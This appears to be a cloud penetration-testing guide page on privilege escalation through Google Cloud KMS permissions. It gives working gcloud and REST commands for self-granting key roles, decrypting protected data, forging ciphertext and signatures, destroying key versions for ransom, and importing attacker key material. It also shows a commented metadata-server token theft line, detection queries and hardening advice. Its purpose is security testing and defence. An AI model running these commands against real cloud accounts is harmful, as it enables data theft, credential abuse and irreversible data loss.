---
cstg_id: CSTG-GCP-KMS-PRIVESC
title: "GCP Kms - Privilege Escalation"
provider: gcp
service: kms
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - cloudkms.cryptoKeys.setIamPolicy
  - cloudkms.keyRings.setIamPolicy
  - cloudkms.cryptoKeyVersions.useToDecrypt
  - cloudkms.cryptoKeyVersions.useToEncrypt
  - cloudkms.cryptoKeyVersions.useToSign
  - cloudkms.cryptoKeyVersions.destroy
  - cloudkms.cryptoKeys.update
  - cloudkms.importJobs.create
tools:
  - gcloud CLI
  - Cloud KMS REST/RPC API
  - PrivEsc analysis tooling (e.g. privilege-mapping utilities)
references:
  - "https://cloud.google.com/kms/docs/reference/permissions-and-roles"
  - "https://cloud.google.com/kms/docs/reference/rest"
  - "https://cloud.google.com/kms/docs/separation-of-duties"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://cloud.google.com/storage/docs/encryption/using-customer-managed-keys"
license: CC BY-SA 4.0
---

## Summary

This page covers privilege escalation and lateral movement that becomes possible when a
compromised principal holds permissions on Cloud KMS resources. KMS is not a typical
privilege-escalation surface in the sense of becoming `roles/owner`; instead it is the control
point for confidentiality. Escalation here means: (1) self-granting broader KMS roles via a
`setIamPolicy` permission, and (2) using cryptographic permissions to break the protection of
data and credentials that the key guards - decrypting CMEK-protected secrets, signing as a
key, or destroying keys for ransom/denial of service.

The starting point is an assumed-breach foothold (a leaked key, a token from a compromised
workload's metadata server, or a service-account impersonation chain) that carries one or more
KMS permissions. The objective is to convert that KMS access into access to the plaintext data
or credentials it protects, or into permanent control over the key.

## Prerequisites

- An assumed-breach identity (user, service account, or workload-derived token) with one or
  more of the permissions enumerated below, on at least one key or key ring.
- Knowledge of the target key resource names and the resources that depend on them - produced
  by [GCP KMS - Enumeration](../02-services/gcp-kms-enum.md).
- For data-decryption paths, access to the ciphertext (for example the encrypted objects in a
  CMEK bucket, or a DEK wrapped by the KMS key).
- A reachable token for the principal:

```bash
TOKEN=$(gcloud auth print-access-token)
# or, on a compromised GCE/GKE workload:
# TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
#   'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq -r .access_token)
```

## Enumeration

Confirm which KMS permissions the current principal actually holds on a target key before
acting (avoids noisy failed calls and identifies the viable path):

```bash
BASE="https://cloudkms.googleapis.com/v1"
KEY="projects/$PROJECT/locations/$LOC/keyRings/$KEYRING/cryptoKeys/$KEY"

curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$BASE/$KEY:testIamPermissions" \
  -d '{"permissions":[
        "cloudkms.cryptoKeys.setIamPolicy",
        "cloudkms.cryptoKeyVersions.useToDecrypt",
        "cloudkms.cryptoKeyVersions.useToEncrypt",
        "cloudkms.cryptoKeyVersions.useToSign",
        "cloudkms.cryptoKeyVersions.destroy",
        "cloudkms.cryptoKeys.update",
        "cloudkms.importJobs.create"]}'
```

Each permission below maps to a distinct escalation/abuse path.

## Misconfigurations & Findings

- A non-administrator principal holding `cloudkms.cryptoKeys.setIamPolicy` or
  `cloudkms.keyRings.setIamPolicy` - the canonical KMS self-escalation primitive.
- Use roles (`cryptoKeyEncrypterDecrypter`, `cryptoKeyDecrypter`,
  `cryptoKeyEncrypterDecrypterViaDelegation`, `signerVerifier`) granted to workload service
  accounts whose tokens are reachable from compromised compute.
- `cryptoKeyVersions.destroy` reachable by a principal that does not own the data lifecycle.
- The same principal able to both manage and use a key (separation-of-duties failure),
  letting it grant itself usage if it lacks it, then decrypt.

## Exploitation

### cloudkms.cryptoKeys.setIamPolicy

Directly overwrite the key's IAM policy to grant the current principal (or any controlled
principal) a powerful KMS role. This is the primary escalation path.

```bash
PRINCIPAL="user:attacker@example.com"   # or serviceAccount:...

# Grant yourself encrypt/decrypt on the key
gcloud kms keys add-iam-policy-binding "$KEY_SHORT" \
  --keyring "$KEYRING" --location "$LOC" --project "$PROJECT" \
  --member "$PRINCIPAL" \
  --role "roles/cloudkms.cryptoKeyEncrypterDecrypter"
```

REST equivalent (read-modify-write the policy; preserve the `etag`):

```bash
POL=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/$KEY:getIamPolicy")
ETAG=$(echo "$POL" | jq -r .etag)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$BASE/$KEY:setIamPolicy" -d "{\"policy\":{\"etag\":\"$ETAG\",\"bindings\":[
    {\"role\":\"roles/cloudkms.cryptoKeyEncrypterDecrypter\",\"members\":[\"$PRINCIPAL\"]}]}}"
```

Once the binding lands, proceed to the decrypt path below. The same applies to
`cloudkms.keyRings.setIamPolicy`, which escalates across every key in the ring at once.

### cloudkms.cryptoKeyVersions.useToDecrypt

Decrypt the data and credentials the key protects. This is the highest-impact data path.

```bash
# Direct decrypt of a wrapped DEK or ciphertext blob
gcloud kms decrypt \
  --key "$KEY_SHORT" --keyring "$KEYRING" --location "$LOC" --project "$PROJECT" \
  --ciphertext-file ciphertext.bin --plaintext-file plaintext.out
```

For CMEK-protected resources, the storage layer decrypts transparently once the principal can
use the key - downloading a CMEK Cloud Storage object, reading a CMEK BigQuery table, or
attaching a CMEK disk all succeed if the principal also has the data-plane read permission and
key-use permission. Combine the dependency map from enumeration: every bucket/disk/dataset/
secret bound to this key is now readable.

### cloudkms.cryptoKeyVersions.useToEncrypt

Encrypt attacker-chosen data with the production key. Enables forging valid CMEK ciphertext
(for example crafting a wrapped DEK the platform will accept), tampering with stored data so
it still decrypts cleanly, or staging data that appears legitimately key-protected.

```bash
gcloud kms encrypt \
  --key "$KEY_SHORT" --keyring "$KEYRING" --location "$LOC" --project "$PROJECT" \
  --plaintext-file payload.bin --ciphertext-file forged.bin
```

### cloudkms.cryptoKeyVersions.useToSign

For `ASYMMETRIC_SIGN` or `MAC` keys, sign arbitrary content as the key. If the key backs a
trust relationship (artifact/image signing, token signing, document attestation), this lets
the attacker mint signatures that downstream verifiers accept.

```bash
# Asymmetric sign
gcloud kms asymmetric-signature sign \
  --version 1 --key "$KEY_SHORT" --keyring "$KEYRING" --location "$LOC" \
  --digest-algorithm sha256 --input-file message.bin --signature-file message.sig

# MAC sign
gcloud kms mac-sign \
  --version 1 --key "$KEY_SHORT" --keyring "$KEYRING" --location "$LOC" \
  --input-file message.bin --signature-file message.mac
```

### cloudkms.cryptoKeyVersions.destroy

Schedule key versions for destruction. For a key protecting production data, destroying every
version renders all CMEK-protected data permanently unrecoverable - a ransom/denial-of-service
primitive rather than an access gain.

```bash
gcloud kms keys versions destroy "$VERSION" \
  --key "$KEY_SHORT" --keyring "$KEYRING" --location "$LOC" --project "$PROJECT"
```

(Within the `destroyScheduledDuration` window the action is reversible via `restore`; after it
elapses the material is gone.)

### cloudkms.cryptoKeys.update

Weaken the key's posture: disable a primary version, change rotation behavior, or move the
primary to an attacker-influenced version, degrading protection or availability of the
dependent data.

```bash
gcloud kms keys update "$KEY_SHORT" \
  --keyring "$KEYRING" --location "$LOC" --project "$PROJECT" \
  --remove-rotation-schedule
```

### cloudkms.importJobs.create

Create an import job and import attacker-supplied key material into the key
(`cloudkms.cryptoKeyVersions.create` with an import job). The principal then controls the
underlying key bytes out-of-band - it can decrypt captured ciphertext or forge ciphertext
offline, and set the imported version as primary so future operations use known material.

```bash
gcloud kms import-jobs create "$IMPORTJOB" \
  --keyring "$KEYRING" --location "$LOC" --project "$PROJECT" \
  --import-method rsa-oaep-3072-sha1-aes-256 --protection-level software
# then wrap attacker key material with the import job's public key and import it as a version
```

## Detection & Logging

- **Cloud Audit Logs / Admin Activity** (always on) record the management-plane escalation
  actions: `SetIamPolicy` on a key or key ring, `UpdateCryptoKey`,
  `DestroyCryptoKeyVersion`, `RestoreCryptoKeyVersion`, `CreateImportJob`, and
  `CreateCryptoKeyVersion` with `importJob`.
- **Cloud Audit Logs / Data Access** (must be enabled for the Cloud KMS API) record the
  cryptographic abuse: `Decrypt`, `Encrypt`, `AsymmetricSign`, `AsymmetricDecrypt`, `MacSign`.
  Without this enabled, the decrypt/sign/encrypt steps leave no log.
- High-fidelity alerts:
  - `SetIamPolicy` on `cloudkms_cryptokey`/`cloudkms_keyring` adding a use role, especially
    where the actor is the new beneficiary.
  - `DestroyCryptoKeyVersion`, particularly multiple versions of one key in quick succession.
  - A spike in `Decrypt` volume from a principal that does not normally use the key, or
    decrypt activity immediately following an IAM change on the same key.
  - `CreateImportJob` / imported `CreateCryptoKeyVersion`.

```
resource.type=("cloudkms_cryptokey" OR "cloudkms_keyring")
protoPayload.methodName=("SetIamPolicy" OR
  "DestroyCryptoKeyVersion" OR "CreateImportJob" OR
  "google.cloud.kms.v1.KeyManagementService.Decrypt")
```

## Remediation & Hardening

- Never grant `cloudkms.cryptoKeys.setIamPolicy` / `cloudkms.keyRings.setIamPolicy` to
  principals that are not dedicated key administrators; keep this strictly separate from key
  usage (enforce separation of duties).
- Grant only the narrowest use role required (`cryptoKeyDecrypter` or `cryptoKeyEncrypter`,
  not the combined role) and bind it at the individual key, not at project/folder/org.
- Restrict `cloudkms.cryptoKeyVersions.destroy` and set a long `destroyScheduledDuration` so
  destructive actions have a recovery window; alert on every destroy.
- Restrict `cloudkms.importJobs.create` and `cryptoKeyVersions.create` to key administrators
  only; prefer Google-generated key material where external material is not required.
- Enable Data Access audit logging for Cloud KMS so cryptographic operations are recorded.
- Use IAM Conditions and Organization Policy to constrain who and what can bind KMS roles, and
  separate the key project from the data project so a data-plane compromise does not also
  grant key administration.
- Reduce token reachability: avoid attaching highly KMS-privileged service accounts to
  internet-facing workloads whose metadata token can be stolen.

## Tools

- **gcloud CLI** - `gcloud kms` subcommands for IAM binding, encrypt/decrypt, sign, destroy,
  update, and import.
- **Cloud KMS REST/RPC API** - direct `setIamPolicy`/`decrypt`/`encrypt`/`asymmetricSign`
  calls when only a bearer token is available.
- **Privilege-mapping utilities** - tools that build a permission-to-attack-path graph and
  flag KMS `setIamPolicy` and use-role grants reachable from a compromised principal.

## References

- Cloud KMS permissions and roles - https://cloud.google.com/kms/docs/reference/permissions-and-roles
- Cloud KMS REST API reference - https://cloud.google.com/kms/docs/reference/rest
- Separation of duties for Cloud KMS - https://cloud.google.com/kms/docs/separation-of-duties
- GCP privilege escalation research - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Using customer-managed encryption keys (CMEK) - https://cloud.google.com/storage/docs/encryption/using-customer-managed-keys
